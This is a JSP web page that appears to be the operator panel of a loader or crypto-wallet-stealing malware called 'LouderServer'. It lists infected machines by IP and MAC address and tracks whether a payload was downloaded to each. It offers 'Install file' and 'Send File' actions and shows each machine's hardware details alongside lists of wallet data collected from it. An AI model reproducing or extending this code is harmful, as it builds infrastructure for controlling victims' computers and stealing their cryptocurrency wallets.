<%@ page import = "java.util.ArrayList,java.util.Map,com.Databases.DownloadStatus,com.Databases.WalletstatisticsCRUD,com.Model.WalletStatistics,com.DisplayContent.WalletstatisticsPagination,com.Model.PcHardware" %>

<!doctype html>
<html lang="en">
<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css" >
    <link rel="stylesheet" href="styles/style.css">
    <title>Admin Panel</title>
</head>
<body>

    <%
    WalletstatisticsPagination.pagination_init();
    %>

   <%!
   DownloadStatus status_down= new DownloadStatus();
    WalletstatisticsCRUD db_operation= new WalletstatisticsCRUD();
    ArrayList<WalletStatistics> items;
    ArrayList<String> wallet_all= new ArrayList<String>();
    PcHardware items_hardware;
    int count_pag=0,wallet_type=0;
    String modal_access,mac_address,modal_access_wallet;
    String wallet_access = new String();
    %>

<div class="nav_bar" >
    <a class="active" href="#home">Admin Panel</a>
       <a href="http://localhost:8080/LouderServer/hardwareinfo.jsp">hardware</a>
       <div class="logout_component">
       <a class="logoutstyle" href="#logout" >Logout</a>
    </div>
</div>


<div class="container">

<%
if(db_operation.get_data_is_empty()==0){
%>

<div class="row">
  <div class="emptycol" style="height:180px; width: 1024px;"></div>
</div>

<div class="row">
  <div class="col"></div>
    <div class="col" style="height: 60px; width: 400px;">
      <center>
        <div class="alert alert-danger" role="alert" style="height: 120px;width: 350px;size: 36px;font-size: 28px;">
          For this page data is not exists!!!
        </div>
      </center>
    </div>
  <div class="col"></div>
</div>


<%
}
else{
%>

<!--<form action="http://localhost:8080/LouderServer/serv/StatusServlet" method="POST"> -->

<div class="row">
  <div class="emptycol" style="height:65px; width: 1024px;"></div>
</div>

<div class="row">
    <div class="emptycol" style="height:50px; width: 1024px;">
      <h2>Statistics</h2>
       <button class="btn btn-success" style="margin-left: 91%;margin-top: -6%;" >Send File</button>
    </div>
</div>


<div class="row">

        <div class="tableinfo" style="width: 1024px;">

          <table class="table">
              <thead class="thead-dark">
                <tr>
                  <th scope="col">#</th>
                  <th scope="col">Date</th>
                  <th scope="col">IP</th>
                  <th scope="col">Download status</th>
                  <th scope="col">Action</th>
                </tr>
              </thead>


              <%

              if(WalletstatisticsPagination.get_curent_page()!=1){
              items=db_operation.get_interval_items((WalletstatisticsPagination.get_curent_page()*20)-20);
               count_pag=(WalletstatisticsPagination.get_curent_page()*20)-20;
              }else{
               items=db_operation.get_interval_items(WalletstatisticsPagination.get_curent_page());
                count_pag=WalletstatisticsPagination.get_curent_page();
              }


              for(int i=0;i<items.size();++i){
              %>
              <tbody>
                <tr>
                  <th scope="row"><%= count_pag %></th>
                  <td><%= items.get(i).getDate()%></td>
                  <td>
                    <a href="http://localhost:8080/LouderServer/serv/PaginationServlet?display=modal&macaddress=<%=items.get(i).getMacaddress()%>" ><%= items.get(i).getIpaddress()%></a>
                  </td>
                  <td>
                        <%
                            if(status_down.get_download_status(items.get(i).getMacaddress())==true){
                        %>
                             <h4 style="color:red;">Downloaded</h4>
                        <%
                        }
                        else {
                        %>
                              <h4 style="color:green;">Waiting</h4>
                        <%
                        }
                        %>
                  </td>
                  <td>
                     <!-- href="LinkURL" target="_blank">
                         <div class="form-check">
                           <input type="checkbox" class="form-check-input" name="status" value="<%=items.get(i).getMacaddress()%>" >
                           <label class="form-check-label" for="exampleCheck1">Install file</label>
                         </div>-->
                          <button  class="btn btn-success"  onclick="location.href='http://google.com';" >Install file</button>

                  </td>
                </tr>
              </tbody>
              <%
              ++count_pag;
              }
              %>

        </table>

        </div>
</div>



<div class="row">
<div class="col"></div>
<div class="col">
        <div class="paginationinfo" style="height: 60px; width: 400px;">
                 <nav aria-label="Page navigation example">
                   <ul class="pagination">
                     <li class="page-item"><a class="page-link" href="http://localhost:8080/LouderServer/serv/PaginationServlet?display=wallet&action=prev&curent_page=empty">Previous</a></li>
                     <% for(int i=WalletstatisticsPagination.get_previous_page();i<=WalletstatisticsPagination.get_next_page();++i){
                         if(i==WalletstatisticsPagination.get_curent_page()){
                     %>
                    <li class="page-item"><a class="page-link" style="background-color:#4caf5078;" href="http://localhost:8080/LouderServer/serv/PaginationServlet?display=wallet&action=empty&curent_page=<%=i%>"><%=i%></a></li>
                    <% }else{
                    %>
                     <li class="page-item"><a class="page-link" href="http://localhost:8080/LouderServer/serv/PaginationServlet?display=wallet&action=empty&curent_page=<%=i%>"><%=i%></a></li>
                     <%}
                     }
                     %>
                     <li class="page-item"><a class="page-link" href="http://localhost:8080/LouderServer/serv/PaginationServlet?display=wallet&action=next&curent_page=empty">Next</a></li>
                   </ul>
                 </nav>
               </div>
  </div>
  <div class="col"></div>
</div>

<%
}
%>

<!-- </form>-->

</div>


<div class="modal fade" id="ModalHardware" tabindex="-1" role="dialog" aria-labelledby="ModalHardwareLabel" aria-hidden="true" style="padding-top: 170px;" >
  <div class="modal-dialog" role="document" >
    <div class="modal-content" style="width: auto;height:auto;">
      <div class="modal-header" style="background-color:#212529;color: #fff;">
        <h3 class="modal-title" id="ModalHardwareLabel">Hardware info</h3>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="color: #fff;">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <center>
        <%
        items_hardware=new PcHardware();
        mac_address=request.getParameter("mac");
        items_hardware=db_operation.get_all_items(mac_address);
        %>

        <div class="container">
        <div class="row">
          <div class="col">
            <div class="inlines"><h3>IP:</h3></div>
            <div class="inlines"><p><%=items_hardware.getIp()%></p></div>
          </div>
        </div>
        <div class="row">
          <div class="col">
              <div class="inlines"><h3>MAC:</h3></div>
              <div class="inlines"><p><%=items_hardware.getMacaddress()%></p></div>
          </div>
        </div>
        <div class="row">
          <div class="col">
              <div class="inlines"><h3>CPU:</h3></div>
              <div class="inlines"><p><%=items_hardware.getCpu_type()%></p></div>
          </div>
        </div>
        <div class="row">
          <div class="col">
              <div class="inlines"><h3>GPU:</h3></div>
              <div class="inlines"><p><%=items_hardware.getGpu_type()%></p></div>
          </div>
        </div>
        <div class="row">
          <div class="col">
              <div class="inlines"><h3>RAM:</h3></div>
              <div class="inlines"><p><%=items_hardware.getPhysicalmemory()%></p></div>
          </div>
        </div>
        <div class="row">
          <div class="col">
              <div class="inlines"><h3>OStype:</h3></div>
              <div class="inlines"><p><%=items_hardware.getOstype()%></p></div>
          </div>
        </div>

      </div>

  </center>
      </div>
    </div>
  </div>
</div>



<div class="modal fade" id="ModalWallet" tabindex="-1" role="dialog" aria-labelledby="ModalWalletLabel" aria-hidden="true" style="padding-top: 170px;" >

<%
wallet_access=request.getParameter("wallettype");
if(wallet_access!=null){
wallet_type=Integer.parseInt(wallet_access);
wallet_all=db_operation.get_all_wallet(request.getParameter("mac"),wallet_type);
%>
  <div class="modal-dialog" role="document" >
    <div class="modal-content" style="width: auto;height:auto;">
      <div class="modal-header" style="background-color:#212529;color: #fff;">
        <h3 class="modal-title" id="ModalWalletLabel"><%= db_operation.get_type_wallet(wallet_type) %></h3>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close" style="color: #fff;">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <center>
            <div class="container">
            <div class="row">
              <div class="col">
                <div class="inlines"><h3>IP:</h3></div>
                <div class="inlines"><p><%= db_operation.get_ip(request.getParameter("mac")) %></p></div>
              </div>
            </div>
            <div class="row">
              <div class="col">
                <div style="overflow-y: scroll; height:200px;">
                <%
                for(int i=0;i<wallet_all.size();++i){
                %>
                    <p><%=wallet_all.get(i)%></p>
                 <%
                  }
                  wallet_type=0;
                  }
                 %>
                </div>
              </div>
            </div>
          </div>
        </center>
      </div>
    </div>
  </div>
</div>




<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="bootstrap/js/bootstrap.min.js" ></script>

<%
modal_access=request.getParameter("modalaces");
if(modal_access!=null && modal_access.equals("true") ){
%>

<script type="text/javascript" >
$('#ModalHardware').appendTo("body").modal('show');
</script>

<%
}
%>



<%
modal_access_wallet=request.getParameter("modalaces_wallet");
if(modal_access_wallet!=null && modal_access_wallet.equals("true")){
%>

<script type="text/javascript" >
$('#ModalWallet').appendTo("body").modal('show');
</script>

<%
}
%>


  </body>
</html>
